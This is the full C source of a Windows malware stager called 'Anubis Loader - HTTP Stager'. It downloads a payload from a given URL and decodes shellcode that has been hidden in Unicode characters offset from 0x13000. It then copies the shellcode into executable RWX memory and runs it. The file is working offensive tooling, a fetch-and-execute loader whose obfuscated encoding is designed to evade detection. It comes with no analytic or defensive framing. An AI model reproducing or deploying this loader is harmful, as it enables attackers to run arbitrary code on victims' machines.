#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include <stdint.h>

#pragma comment(lib, "wininet.lib")

// Function to download payload from URL
BYTE* DownloadPayload(const char* url, DWORD* payloadSize) {
    HINTERNET hInternet = NULL;
    HINTERNET hUrl = NULL;
    BYTE* buffer = NULL;
    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;
    DWORD bufferSize = 4096;
    BYTE tempBuffer[4096];

    printf("[*] Downloading payload from: %s\n", url);

    // Initialize WinINet
    hInternet = InternetOpenA("AnubisLoader/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        printf("[!] InternetOpenA failed: %lu\n", GetLastError());
        return NULL;
    }

    // Open URL
    hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        printf("[!] InternetOpenUrlA failed: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return NULL;
    }

    // Allocate initial buffer
    buffer = (BYTE*)malloc(bufferSize);
    if (!buffer) {
        printf("[!] Failed to allocate memory for download buffer\n");
        goto cleanup;
    }

    // Read data in chunks
    while (InternetReadFile(hUrl, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {
        // Resize buffer if needed
        if (totalBytesRead + bytesRead > bufferSize) {
            bufferSize *= 2;
            BYTE* newBuffer = (BYTE*)realloc(buffer, bufferSize);
            if (!newBuffer) {
                printf("[!] Failed to reallocate memory for download buffer\n");
                free(buffer);
                buffer = NULL;
                goto cleanup;
            }
            buffer = newBuffer;
        }

        // Copy chunk to main buffer
        memcpy(buffer + totalBytesRead, tempBuffer, bytesRead);
        totalBytesRead += bytesRead;
    }

    if (totalBytesRead == 0) {
        printf("[!] Failed to download payload or empty response\n");
        free(buffer);
        buffer = NULL;
        goto cleanup;
    }

    printf("[*] Downloaded %lu bytes\n", totalBytesRead);
    *payloadSize = totalBytesRead;

cleanup:
    if (hUrl) InternetCloseHandle(hUrl);
    if (hInternet) InternetCloseHandle(hInternet);
    return buffer;
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Usage: %s <payload_url>\n", argv[0]);
        printf("Example: %s http://example.com/payload.bin\n", argv[0]);
        return 1;
    }
    
    printf("=== Anubis Loader - HTTP Stager ===\n");
    
    // Download payload from URL
    DWORD file_size = 0;
    char* utf8_buffer = (char*)DownloadPayload(argv[1], &file_size);
    if (!utf8_buffer) {
        printf("[!] Failed to download payload from URL\n");
        return 1;
    }
    
    printf("[*] Payload size: %lu bytes\n", file_size);
    
    // Convert UTF-8 to wide characters
    int wide_chars = MultiByteToWideChar(CP_UTF8, 0, utf8_buffer, file_size, NULL, 0);
    if (wide_chars <= 0) {
        printf("[!] Failed to calculate wide character buffer size\n");
        free(utf8_buffer);
        return 1;
    }
    
    wchar_t* wide_buffer = malloc(wide_chars * sizeof(wchar_t));
    if (!wide_buffer) {
        printf("[!] Failed to allocate memory for wide buffer\n");
        free(utf8_buffer);
        return 1;
    }
    
    int converted = MultiByteToWideChar(CP_UTF8, 0, utf8_buffer, file_size, wide_buffer, wide_chars);
    free(utf8_buffer);
    
    if (converted <= 0) {
        printf("[!] Failed to convert to wide characters\n");
        free(wide_buffer);
        return 1;
    }
    
    // Decode shellcode from Unicode characters
    size_t shellcode_len = 0;
    const uint32_t base_unicode = 0x13000;
    
    for (int i = 0; i < converted; i++) {
        uint32_t char_code;
        
        if ((wide_buffer[i] >= 0xD800) && (wide_buffer[i] <= 0xDBFF) && 
            (i + 1 < converted) && 
            (wide_buffer[i + 1] >= 0xDC00) && (wide_buffer[i + 1] <= 0xDFFF)) {
            uint32_t high_surrogate = wide_buffer[i] & 0x3FF;
            uint32_t low_surrogate = wide_buffer[i + 1] & 0x3FF;
            char_code = 0x10000 + (high_surrogate << 10) + low_surrogate;
            i++;
        } else {
            char_code = (uint32_t)wide_buffer[i];
        }
        
        if (char_code >= base_unicode && char_code <= base_unicode + 0xFF) {
            shellcode_len++;
        }
    }
    
    if (shellcode_len == 0) {
        printf("[!] No valid shellcode bytes found\n");
        free(wide_buffer);
        return 1;
    }
    
    printf("[*] Expected shellcode length: %zu bytes\n", shellcode_len);
    
    unsigned char* shellcode = malloc(shellcode_len);
    if (!shellcode) {
        printf("[!] Failed to allocate memory for shellcode\n");
        free(wide_buffer);
        return 1;
    }
    
    size_t shellcode_index = 0;
    for (int i = 0; i < converted && shellcode_index < shellcode_len; i++) {
        uint32_t char_code;
        
        if ((wide_buffer[i] >= 0xD800) && (wide_buffer[i] <= 0xDBFF) && 
            (i + 1 < converted) && 
            (wide_buffer[i + 1] >= 0xDC00) && (wide_buffer[i + 1] <= 0xDFFF)) {
            uint32_t high_surrogate = wide_buffer[i] & 0x3FF;
            uint32_t low_surrogate = wide_buffer[i + 1] & 0x3FF;
            char_code = 0x10000 + (high_surrogate << 10) + low_surrogate;
            i++;
        } else {
            char_code = (uint32_t)wide_buffer[i];
        }
        
        if (char_code >= base_unicode && char_code <= base_unicode + 0xFF) {
            shellcode[shellcode_index++] = (unsigned char)(char_code - base_unicode);
        }
    }
    
    free(wide_buffer);
    
    printf("[*] Decoded %zu bytes\n", shellcode_index);
    printf("[*] First 32 bytes: ");
    for (size_t i = 0; i < (shellcode_index < 32 ? shellcode_index : 32); i++) {
        printf("%02X ", shellcode[i]);
    }
    printf("\n");
    
    // Allocate executable memory and execute shellcode
    void* exec_mem = VirtualAlloc(NULL, shellcode_index, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        printf("[!] VirtualAlloc failed\n");
        free(shellcode);
        return 1;
    }
    
    memcpy(exec_mem, shellcode, shellcode_index);
    
    printf("[*] Shellcode allocated at: %p\n", exec_mem);
    printf("[*] Press Enter to execute...");
    getchar();
    
    // Execute shellcode
    void (*shellcode_func)() = (void (*)())exec_mem;
    shellcode_func();
    
    free(shellcode);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return 0;
}
